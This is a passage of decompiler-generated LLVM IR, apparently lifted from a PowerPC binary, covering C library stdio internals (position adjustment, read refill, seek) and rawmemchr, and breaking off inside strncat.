  store i16 %v1_1000e82c.sink.off0, i16* %v1_1000e824, align 2
  %v0_1000e850.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e840

dec_label_pc_1000e840:                            ; preds = %entry, %dec_label_pc_1000e814, %dec_label_pc_1000e83c
  %v0_1000e850 = phi i32 [ 0, %entry ], [ %v1_1000e818, %dec_label_pc_1000e814 ], [ %v0_1000e850.pre, %dec_label_pc_1000e83c ]
  store i32 %v0_1000e7ec, i32* @r31, align 4
  ret i32 %v0_1000e850

; uselistorder directives
  uselistorder i16 %v2_1000e824, { 1, 0 }
  uselistorder i32 %v1_1000e818, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e840, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e83c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e814, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000e86c = load i16, i16* %arg1, align 2
  %v4_1000e86c = zext i16 %v3_1000e86c to i32
  %tmp9 = urem i16 %v3_1000e86c, 4
  %v3_1000e870 = icmp eq i16 %tmp9, 0
  br i1 %v3_1000e870, label %dec_label_pc_1000e8bc, label %dec_label_pc_1000e878

dec_label_pc_1000e878:                            ; preds = %entry
  %v1_1000e870 = zext i16 %tmp9 to i32
  %v1_1000e878 = add nsw i32 %v1_1000e870, -1
  store i32 %v1_1000e878, i32* %r10.global-to-local, align 4
  %v4_1000e878 = icmp eq i32 %v1_1000e878, 0
  br i1 %v4_1000e878, label %dec_label_pc_1000e8bc, label %dec_label_pc_1000e880

dec_label_pc_1000e880:                            ; preds = %dec_label_pc_1000e878
  %v1_1000e880 = and i32 %v4_1000e86c, 2048
  %v3_1000e880 = icmp eq i32 %v1_1000e880, 0
  br i1 %v3_1000e880, label %dec_label_pc_1000e8bc, label %dec_label_pc_1000e888

dec_label_pc_1000e888:                            ; preds = %dec_label_pc_1000e880
  %v2_1000e888 = icmp sgt i32 %v1_1000e878, 1
  br i1 %v2_1000e888, label %dec_label_pc_1000e934, label %dec_label_pc_1000e890

dec_label_pc_1000e890:                            ; preds = %dec_label_pc_1000e888
  %v2_1000e890 = add i32 %tmp, 40
  %v3_1000e890 = inttoptr i32 %v2_1000e890 to i32*
  %v4_1000e890 = load i32, i32* %v3_1000e890, align 4
  %v3_1000e894 = icmp eq i32 %v4_1000e890, 0
  br i1 %v3_1000e894, label %dec_label_pc_1000e89c, label %dec_label_pc_1000e934

dec_label_pc_1000e89c:                            ; preds = %dec_label_pc_1000e890
  %v2_1000e89c = add i32 %tmp, 44
  %v3_1000e89c = inttoptr i32 %v2_1000e89c to i32*
  %v4_1000e89c = load i32, i32* %v3_1000e89c, align 4
  %v2_1000e8a0 = add i32 %tmp, 3
  %v3_1000e8a0 = inttoptr i32 %v2_1000e8a0 to i8*
  %v4_1000e8a0 = load i8, i8* %v3_1000e8a0, align 1
  %v5_1000e8a0 = zext i8 %v4_1000e8a0 to i32
  %v2_1000e8a8 = sub nsw i32 %v1_1000e878, %v5_1000e8a0
  %v1_1000e8ac = add nsw i32 %v2_1000e8a8, -1
  store i32 %v1_1000e8ac, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000e89c, 1
  br i1 %tmp7, label %dec_label_pc_1000e8bc, label %dec_label_pc_1000e8b4

dec_label_pc_1000e8b4:                            ; preds = %dec_label_pc_1000e89c
  %v2_1000e8b4 = add i32 %tmp, 2
  %v3_1000e8b4 = inttoptr i32 %v2_1000e8b4 to i8*
  %v4_1000e8b4 = load i8, i8* %v3_1000e8b4, align 1
  %v5_1000e8b4 = zext i8 %v4_1000e8b4 to i32
  %v2_1000e8b8 = sub nsw i32 %v1_1000e8ac, %v5_1000e8b4
  store i32 %v2_1000e8b8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e8bc

dec_label_pc_1000e8bc:                            ; preds = %dec_label_pc_1000e89c, %dec_label_pc_1000e880, %dec_label_pc_1000e878, %entry, %dec_label_pc_1000e8b4
  %v0_1000e8e0 = phi i32 [ %v1_1000e8ac, %dec_label_pc_1000e89c ], [ %v1_1000e878, %dec_label_pc_1000e880 ], [ 0, %dec_label_pc_1000e878 ], [ 0, %entry ], [ %v2_1000e8b8, %dec_label_pc_1000e8b4 ]
  %v1_1000e8bc = and i32 %v4_1000e86c, 64
  %v3_1000e8bc = icmp eq i32 %v1_1000e8bc, 0
  %storemerge.in.in.v = select i1 %v3_1000e8bc, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1000e8d0 = add i32 %tmp, 16
  %v3_1000e8d0 = inttoptr i32 %v2_1000e8d0 to i32*
  %v4_1000e8d0 = load i32, i32* %v3_1000e8d0, align 4
  %v1_1000e8d4 = inttoptr i32 %arg2 to i32*
  %v2_1000e8d4 = load i32, i32* %v1_1000e8d4, align 4
  store i32 %v2_1000e8d4, i32* %r4.global-to-local, align 4
  %v2_1000e8d8 = sub i32 %storemerge, %v4_1000e8d0
  %v1_1000e8dc = add i32 %arg2, 4
  %v2_1000e8dc = inttoptr i32 %v1_1000e8dc to i32*
  %v3_1000e8dc = load i32, i32* %v2_1000e8dc, align 4
  store i32 %v3_1000e8dc, i32* %r5.global-to-local, align 4
  %v2_1000e8e0 = add i32 %v2_1000e8d8, %v0_1000e8e0
  store i32 %v2_1000e8e0, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1000e8e0, 0
  %v1_1000e8e8 = zext i1 %tmp10 to i32
  %v2_1000e8e8 = ashr i32 %v2_1000e8e0, 31
  %v3_1000e8e8 = and i32 %v2_1000e8e8, -2
  %v4_1000e8e8 = or i32 %v3_1000e8e8, %v1_1000e8e8
  %v2_1000e8ec = sub i32 %v3_1000e8dc, %v2_1000e8e0
  %v3_1000e8ec = sub i32 -1, %v2_1000e8e0
  store i32 %v2_1000e8ec, i32* %r10.global-to-local, align 4
  %v6_1000e8ec = icmp ule i32 %v2_1000e8ec, %v3_1000e8ec
  %v2_1000e8f0 = sub nsw i32 -1, %v4_1000e8e8
  %v3_1000e8f0 = add i32 %v2_1000e8d4, %v2_1000e8f0
  %v5_1000e8f0 = zext i1 %v6_1000e8ec to i32
  %v6_1000e8f0 = add i32 %v3_1000e8f0, %v5_1000e8f0
  store i32 %v6_1000e8f0, i32* %v1_1000e8d4, align 4
  %v0_1000e8f8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e8f8 = load i32, i32* @r8, align 4
  %v2_1000e8f8 = add i32 %v1_1000e8f8, 4
  %v3_1000e8f8 = inttoptr i32 %v2_1000e8f8 to i32*
  store i32 %v0_1000e8f8, i32* %v3_1000e8f8, align 4
  %v0_1000e8fc = load i32, i32* @r8, align 4
  %v1_1000e8fc = inttoptr i32 %v0_1000e8fc to i32*
  %v2_1000e8fc = load i32, i32* %v1_1000e8fc, align 4
  %v1_1000e900 = load i32, i32* %r4.global-to-local, align 4
  %v3_1000e900 = icmp sgt i32 %v2_1000e8fc, %v1_1000e900
  br i1 %v3_1000e900, label %dec_label_pc_1000e918, label %dec_label_pc_1000e908

dec_label_pc_1000e908:                            ; preds = %dec_label_pc_1000e8bc
  %v4_1000e900 = icmp eq i32 %v2_1000e8fc, %v1_1000e900
  br i1 %v4_1000e900, label %dec_label_pc_1000e90c, label %dec_label_pc_1000e91cthread-pre-split

dec_label_pc_1000e90c:                            ; preds = %dec_label_pc_1000e908
  %v1_1000e90c = add i32 %v0_1000e8fc, 4
  %v2_1000e90c = inttoptr i32 %v1_1000e90c to i32*
  %v3_1000e90c = load i32, i32* %v2_1000e90c, align 4
  %v1_1000e910 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000e910 = icmp ugt i32 %v3_1000e90c, %v1_1000e910
  br i1 %v3_1000e910, label %dec_label_pc_1000e918, label %dec_label_pc_1000e91cthread-pre-split

dec_label_pc_1000e918:                            ; preds = %dec_label_pc_1000e90c, %dec_label_pc_1000e8bc
  %v0_1000e918 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e918 = sub i32 0, %v0_1000e918
  store i32 %v1_1000e918, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e91c

dec_label_pc_1000e91cthread-pre-split:            ; preds = %dec_label_pc_1000e908, %dec_label_pc_1000e90c
  %v0_1000e91c.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e91c

dec_label_pc_1000e91c:                            ; preds = %dec_label_pc_1000e91cthread-pre-split, %dec_label_pc_1000e918
  %v0_1000e91c = phi i32 [ %v0_1000e91c.pr, %dec_label_pc_1000e91cthread-pre-split ], [ %v1_1000e918, %dec_label_pc_1000e918 ]
  %tmp8 = icmp sgt i32 %v0_1000e91c, -1
  br i1 %tmp8, label %dec_label_pc_1000e938, label %dec_label_pc_1000e924

dec_label_pc_1000e924:                            ; preds = %dec_label_pc_1000e91c
  %v0_1000e924 = call i32 @__errno_location()
  %v2_1000e92c = inttoptr i32 %v0_1000e924 to i32*
  store i32 75, i32* %v2_1000e92c, align 4
  %v0_1000e93c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e938

dec_label_pc_1000e934:                            ; preds = %dec_label_pc_1000e890, %dec_label_pc_1000e888
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e938

dec_label_pc_1000e938:                            ; preds = %dec_label_pc_1000e91c, %dec_label_pc_1000e924, %dec_label_pc_1000e934
  %v0_1000e93c = phi i32 [ %v0_1000e91c, %dec_label_pc_1000e91c ], [ %v0_1000e93c.pre, %dec_label_pc_1000e924 ], [ -1, %dec_label_pc_1000e934 ]
  ret i32 %v0_1000e93c

; uselistorder directives
  uselistorder i32 %v2_1000e8fc, { 1, 0 }
  uselistorder i32 %v2_1000e8e0, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 2048, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000e938, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e91cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8bc, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000e950 = load i32, i32* @lr, align 4
  store i32 %v0_1000e950, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000e964 = add i32 %arg1, 8
  %v2_1000e964 = inttoptr i32 %v1_1000e964 to i32*
  %v3_1000e964 = load i32, i32* %v2_1000e964, align 4
  %v1_1000e968 = add i32 %arg1, 12
  %v2_1000e968 = inttoptr i32 %v1_1000e968 to i32*
  %v3_1000e968 = load i32, i32* %v2_1000e968, align 4
  %v2_1000e96c = sub i32 %v3_1000e968, %v3_1000e964
  store i32 268495220, i32* @lr, align 4
  %v3_1000e970 = inttoptr i32 %v3_1000e964 to i16*
  %v4_1000e970 = call i32 @__stdio_READ(i16* %v3_1000e970, i32 %v2_1000e96c, i32 %v2_1000e96c)
  %v0_1000e974 = load i32, i32* @r29, align 4
  %v1_1000e974 = add i32 %v0_1000e974, 8
  %v2_1000e974 = inttoptr i32 %v1_1000e974 to i32*
  %v3_1000e974 = load i32, i32* %v2_1000e974, align 4
  %v2_1000e978 = add i32 %v3_1000e974, %v4_1000e970
  store i32 %v2_1000e978, i32* %r0.global-to-local, align 4
  %v2_1000e97c = add i32 %v0_1000e974, 16
  %v3_1000e97c = inttoptr i32 %v2_1000e97c to i32*
  store i32 %v3_1000e974, i32* %v3_1000e97c, align 4
  %v0_1000e980 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e980 = load i32, i32* @r29, align 4
  %v2_1000e980 = add i32 %v1_1000e980, 20
  %v3_1000e980 = inttoptr i32 %v2_1000e980 to i32*
  store i32 %v0_1000e980, i32* %v3_1000e980, align 4
  store i32 %v0_1000e950, i32* %r0.global-to-local, align 4
  ret i32 %v4_1000e970

; uselistorder directives
  uselistorder i32 %v3_1000e974, { 1, 0 }
  uselistorder i32 %v4_1000e970, { 1, 0 }
  uselistorder i32 %v3_1000e964, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1000e9a0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e9ac = load i16, i16* %arg1, align 2
  %v4_1000e9ac = zext i16 %v3_1000e9ac to i32
  %v2_1000e9b0 = and i32 %v4_1000e9ac, %arg2
  %v5_1000e9b0 = icmp eq i32 %v2_1000e9b0, 0
  br i1 %v5_1000e9b0, label %dec_label_pc_1000e9b8, label %dec_label_pc_1000e9c8

dec_label_pc_1000e9b8:                            ; preds = %entry
  %v1_1000e9b8 = and i32 %v4_1000e9ac, 2176
  %v3_1000e9b8 = icmp eq i32 %v1_1000e9b8, 0
  br i1 %v3_1000e9b8, label %dec_label_pc_1000e9c0, label %dec_label_pc_1000e9d4

dec_label_pc_1000e9c0:                            ; preds = %dec_label_pc_1000e9b8
  %v2_1000e9c0 = or i32 %v4_1000e9ac, %arg2
  %v1_1000e9c4 = trunc i32 %v2_1000e9c0 to i16
  store i16 %v1_1000e9c4, i16* %arg1, align 2
  %v0_1000e9c8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e9c8

dec_label_pc_1000e9c8:                            ; preds = %entry, %dec_label_pc_1000e9c0
  %v0_1000e9c8 = phi i32 [ %tmp, %entry ], [ %v0_1000e9c8.pre, %dec_label_pc_1000e9c0 ]
  %v1_1000e9c8 = inttoptr i32 %v0_1000e9c8 to i16*
  %v2_1000e9c8 = load i16, i16* %v1_1000e9c8, align 2
  %v3_1000e9c8 = zext i16 %v2_1000e9c8 to i32
  %v1_1000e9cc = and i32 %v3_1000e9c8, 16
  %v3_1000e9cc = icmp eq i32 %v1_1000e9cc, 0
  br i1 %v3_1000e9cc, label %dec_label_pc_1000e9f0, label %dec_label_pc_1000e9d4

dec_label_pc_1000e9d4:                            ; preds = %dec_label_pc_1000e9b8, %dec_label_pc_1000e9c8
  %v0_1000e9d4 = call i32 @__errno_location()
  store i32 %v0_1000e9d4, i32* %r3.global-to-local, align 4
  %v2_1000e9dc = inttoptr i32 %v0_1000e9d4 to i32*
  store i32 9, i32* %v2_1000e9dc, align 4
  br label %dec_label_pc_1000e9e0

dec_label_pc_1000e9e0:                            ; preds = %dec_label_pc_1000e9f8, %dec_label_pc_1000e9d4
  %v0_1000e9e0 = load i32, i32* @r31, align 4
  %v1_1000e9e0 = inttoptr i32 %v0_1000e9e0 to i16*
  %v2_1000e9e0 = load i16, i16* %v1_1000e9e0, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000e9e8 = or i16 %v2_1000e9e0, 8
  br label %dec_label_pc_1000ea24

dec_label_pc_1000e9f0:                            ; preds = %dec_label_pc_1000e9c8
  %v1_1000e9f0 = and i32 %v3_1000e9c8, 64
  %v3_1000e9f0 = icmp eq i32 %v1_1000e9f0, 0
  br i1 %v3_1000e9f0, label %dec_label_pc_1000ea18, label %dec_label_pc_1000e9f8

dec_label_pc_1000e9f8:                            ; preds = %dec_label_pc_1000e9f0
  store i32 268495356, i32* @lr, align 4
  %v0_1000e9f8 = call i32 @__stdio_wcommit()
  store i32 %v0_1000e9f8, i32* %r3.global-to-local, align 4
  %v3_1000e9fc = icmp eq i32 %v0_1000e9f8, 0
  br i1 %v3_1000e9fc, label %dec_label_pc_1000ea04, label %dec_label_pc_1000e9e0

dec_label_pc_1000ea04:                            ; preds = %dec_label_pc_1000e9f8
  %v0_1000ea04 = load i32, i32* @r31, align 4
  %v1_1000ea04 = inttoptr i32 %v0_1000ea04 to i16*
  %v2_1000ea04 = load i16, i16* %v1_1000ea04, align 2
  %v3_1000ea04 = zext i16 %v2_1000ea04 to i32
  %v1_1000ea08 = add i32 %v0_1000ea04, 8
  %v2_1000ea08 = inttoptr i32 %v1_1000ea08 to i32*
  %v3_1000ea08 = load i32, i32* %v2_1000ea08, align 4
  %v1_1000ea0c = call i32 @__asm_rlwinm(i32 %v3_1000ea04, i32 0, i32 26, i32 24)
  %v2_1000ea0c = trunc i32 %v1_1000ea0c to i16
  %v1_1000ea10 = load i32, i32* @r31, align 4
  %v2_1000ea10 = add i32 %v1_1000ea10, 28
  %v3_1000ea10 = inttoptr i32 %v2_1000ea10 to i32*
  store i32 %v3_1000ea08, i32* %v3_1000ea10, align 4
  %v3_1000ea14 = load i32, i32* @r31, align 4
  %v4_1000ea14 = inttoptr i32 %v3_1000ea14 to i16*
  store i16 %v2_1000ea0c, i16* %v4_1000ea14, align 2
  %v0_1000ea18.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ea18

dec_label_pc_1000ea18:                            ; preds = %dec_label_pc_1000e9f0, %dec_label_pc_1000ea04
  %v0_1000ea18 = phi i32 [ %v0_1000e9c8, %dec_label_pc_1000e9f0 ], [ %v0_1000ea18.pre, %dec_label_pc_1000ea04 ]
  %v1_1000ea18 = inttoptr i32 %v0_1000ea18 to i16*
  %v2_1000ea18 = load i16, i16* %v1_1000ea18, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000ea20 = or i16 %v2_1000ea18, 1
  br label %dec_label_pc_1000ea24

dec_label_pc_1000ea24:                            ; preds = %dec_label_pc_1000e9e0, %dec_label_pc_1000ea18
  %v2_1000ea24 = phi i32 [ %v0_1000e9e0, %dec_label_pc_1000e9e0 ], [ %v0_1000ea18, %dec_label_pc_1000ea18 ]
  %storemerge.off0 = phi i16 [ %v1_1000e9e8, %dec_label_pc_1000e9e0 ], [ %v1_1000ea20, %dec_label_pc_1000ea18 ]
  %v3_1000ea24 = inttoptr i32 %v2_1000ea24 to i16*
  store i16 %storemerge.off0, i16* %v3_1000ea24, align 2
  store i32 %v0_1000e9a0, i32* @r31, align 4
  %v0_1000ea38 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ea38

; uselistorder directives
  uselistorder i32 %v4_1000e9ac, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 1 }
  uselistorder i32 26, { 4, 2, 5, 6, 3, 7, 8, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 64, { 6, 3, 4, 5, 2, 8, 9, 10, 7, 11, 0, 1 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ea24, { 1, 0 }
  uselistorder label %dec_label_pc_1000ea18, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9c8, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1000ea3c = load i32, i32* @lr, align 4
  store i32 %v0_1000ea3c, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_1000ea48 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1000ea54 = add i32 %arg1, 4
  %v2_1000ea54 = inttoptr i32 %v1_1000ea54 to i32*
  %v3_1000ea54 = load i32, i32* %v2_1000ea54, align 4
  %v2_1000ea58 = load i32, i32* %arg2, align 4
  %v1_1000ea5c = add i32 %tmp, 4
  %v2_1000ea5c = inttoptr i32 %v1_1000ea5c to i32*
  %v3_1000ea5c = load i32, i32* %v2_1000ea5c, align 4
  store i32 268495460, i32* @lr, align 4
  %v4_1000ea60 = call i32 @__libc_lseek64(i32 %v3_1000ea54, i32 %v2_1000ea58, i32 %v3_1000ea5c, i32 %arg3)
  %v1_1000ea64 = icmp slt i32 %v4_1000ea60, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1000ea64, label %dec_label_pc_1000ea7c, label %dec_label_pc_1000ea70

dec_label_pc_1000ea70:                            ; preds = %entry
  %v1_1000ea70 = load i32, i32* @r31, align 4
  %v2_1000ea70 = inttoptr i32 %v1_1000ea70 to i32*
  store i32 %v4_1000ea60, i32* %v2_1000ea70, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000ea78 = load i32, i32* @r31, align 4
  %v2_1000ea78 = add i32 %v1_1000ea78, 4
  %v3_1000ea78 = inttoptr i32 %v2_1000ea78 to i32*
  store i32 %tmp, i32* %v3_1000ea78, align 4
  %v0_1000ea7c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ea7c

dec_label_pc_1000ea7c:                            ; preds = %entry, %dec_label_pc_1000ea70
  %v0_1000ea7c = phi i32 [ %tmp, %entry ], [ %v0_1000ea7c.pre, %dec_label_pc_1000ea70 ]
  store i32 %v0_1000ea3c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ea48, i32* @r31, align 4
  ret i32 %v0_1000ea7c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_1000ea7c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000ea94 = urem i32 %arg1, 256
  store i32 %v1_1000ea94, i32* %r4.global-to-local, align 4
  %v0_1000eaac1 = load i32, i32* @r3, align 4
  %v1_1000eaac2 = urem i32 %v0_1000eaac1, 4
  %v3_1000eaac4 = icmp eq i32 %v1_1000eaac2, 0
  br i1 %v3_1000eaac4, label %dec_label_pc_1000eab4, label %dec_label_pc_1000ea9c

dec_label_pc_1000ea9c:                            ; preds = %entry, %dec_label_pc_1000ea9c
  %v1_1000eaa0 = phi i32 [ %v0_1000eab4.pre, %dec_label_pc_1000ea9c ], [ %v1_1000ea94, %entry ]
  %v0_1000ea9c = phi i32 [ %v1_1000eaa8, %dec_label_pc_1000ea9c ], [ %v0_1000eaac1, %entry ]
  %v1_1000ea9c = inttoptr i32 %v0_1000ea9c to i8*
  %v2_1000ea9c = load i8, i8* %v1_1000ea9c, align 1
  %v3_1000ea9c = zext i8 %v2_1000ea9c to i32
  %v4_1000eaa0 = icmp eq i32 %v3_1000ea9c, %v1_1000eaa0
  %v0_1000eaa4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000eaa0, i32 %v0_1000eaa4)
  %v0_1000eaa8 = load i32, i32* @r3, align 4
  %v1_1000eaa8 = add i32 %v0_1000eaa8, 1
  store i32 %v1_1000eaa8, i32* @r3, align 4
  %v1_1000eaac = urem i32 %v1_1000eaa8, 4
  %v3_1000eaac = icmp eq i32 %v1_1000eaac, 0
  %v0_1000eab4.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000eaac, label %dec_label_pc_1000eab4, label %dec_label_pc_1000ea9c

dec_label_pc_1000eab4:                            ; preds = %dec_label_pc_1000ea9c, %entry
  %v0_1000eacc9 = phi i32 [ %v0_1000eaac1, %entry ], [ %v1_1000eaa8, %dec_label_pc_1000ea9c ]
  %v0_1000eab4 = phi i32 [ %v1_1000ea94, %entry ], [ %v0_1000eab4.pre, %dec_label_pc_1000ea9c ]
  %v1_1000eab4 = mul i32 %v0_1000eab4, 256
  %v2_1000eabc = or i32 %v1_1000eab4, %v0_1000eab4
  %v1_1000eac4 = mul i32 %v2_1000eabc, 65536
  %v2_1000eac8 = or i32 %v1_1000eac4, %v2_1000eabc
  br label %dec_label_pc_1000eacc

dec_label_pc_1000eacc:                            ; preds = %dec_label_pc_1000eb38, %dec_label_pc_1000eacc, %dec_label_pc_1000eab4
  %v0_1000eb08 = phi i32 [ %v0_1000eacc9, %dec_label_pc_1000eab4 ], [ %v1_1000ead0, %dec_label_pc_1000eacc ], [ %v1_1000ead0, %dec_label_pc_1000eb38 ]
  %v1_1000eacc = inttoptr i32 %v0_1000eb08 to i32*
  %v2_1000eacc = load i32, i32* %v1_1000eacc, align 4
  %v1_1000ead0 = add i32 %v0_1000eb08, 4
  %v1_1000ead4 = add i32 %v0_1000eb08, 2
  %v2_1000ead8 = xor i32 %v2_1000eacc, %v2_1000eac8
  %v1_1000eae0 = add i32 %v2_1000ead8, 2130640639
  %v2_1000eae4 = xor i32 %v1_1000eae0, %v2_1000ead8
  %v1_1000eae8 = add i32 %v0_1000eb08, 1
  %v2_1000eaec = and i32 %v2_1000eae4, -2130640640
  %v6_1000eaec = icmp eq i32 %v2_1000eaec, -2130640640
  br i1 %v6_1000eaec, label %dec_label_pc_1000eacc, label %dec_label_pc_1000eaf8

dec_label_pc_1000eaf8:                            ; preds = %dec_label_pc_1000eacc
  %v2_1000eaf8 = inttoptr i32 %v0_1000eb08 to i8*
  %v3_1000eaf8 = load i8, i8* %v2_1000eaf8, align 1
  %v4_1000eaf8 = zext i8 %v3_1000eaf8 to i32
  %v1_1000eafc = add i32 %v0_1000eb08, 3
  %v4_1000eb00 = icmp eq i32 %v4_1000eaf8, %v0_1000eab4
  br i1 %v4_1000eb00, label %dec_label_pc_1000eb08, label %dec_label_pc_1000eb10

dec_label_pc_1000eb08:                            ; preds = %dec_label_pc_1000eaf8
  ret i32 %v0_1000eb08

dec_label_pc_1000eb10:                            ; preds = %dec_label_pc_1000eaf8
  %v2_1000eb10 = inttoptr i32 %v1_1000eae8 to i8*
  %v3_1000eb10 = load i8, i8* %v2_1000eb10, align 1
  %v4_1000eb10 = zext i8 %v3_1000eb10 to i32
  %v4_1000eb14 = icmp eq i32 %v4_1000eb10, %v0_1000eab4
  br i1 %v4_1000eb14, label %dec_label_pc_1000eb1c, label %dec_label_pc_1000eb24

dec_label_pc_1000eb1c:                            ; preds = %dec_label_pc_1000eb10
  ret i32 %v1_1000eae8

dec_label_pc_1000eb24:                            ; preds = %dec_label_pc_1000eb10
  %v2_1000eb24 = inttoptr i32 %v1_1000ead4 to i8*
  %v3_1000eb24 = load i8, i8* %v2_1000eb24, align 1
  %v4_1000eb24 = zext i8 %v3_1000eb24 to i32
  %v4_1000eb28 = icmp eq i32 %v4_1000eb24, %v0_1000eab4
  br i1 %v4_1000eb28, label %dec_label_pc_1000eb30, label %dec_label_pc_1000eb38

dec_label_pc_1000eb30:                            ; preds = %dec_label_pc_1000eb24
  ret i32 %v1_1000ead4

dec_label_pc_1000eb38:                            ; preds = %dec_label_pc_1000eb24
  %v2_1000eb38 = inttoptr i32 %v1_1000eafc to i8*
  %v3_1000eb38 = load i8, i8* %v2_1000eb38, align 1
  %v4_1000eb38 = zext i8 %v3_1000eb38 to i32
  %v4_1000eb3c = icmp eq i32 %v4_1000eb38, %v0_1000eab4
  br i1 %v4_1000eb3c, label %dec_label_pc_1000eb44, label %dec_label_pc_1000eacc

dec_label_pc_1000eb44:                            ; preds = %dec_label_pc_1000eb38
  ret i32 %v1_1000eafc

; uselistorder directives
  uselistorder i32 %v1_1000ead0, { 1, 0 }
  uselistorder i32 %v0_1000eb08, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_1000eabc, { 1, 0 }
  uselistorder i32 %v0_1000eab4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000eaa8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000eaac1, { 2, 1, 0 }
  uselistorder i32 %v1_1000ea94, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 10, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000ea9c, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000eb50

dec_label_pc_1000eb50:                            ; preds = %dec_label_pc_1000eb50, %entry
  %v0_1000eb50 = phi i32 [ %v1_1000eb54, %dec_label_pc_1000eb50 ], [ %tmp, %entry ]
  %v1_1000eb50 = inttoptr i32 %v0_1000eb50 to i8*
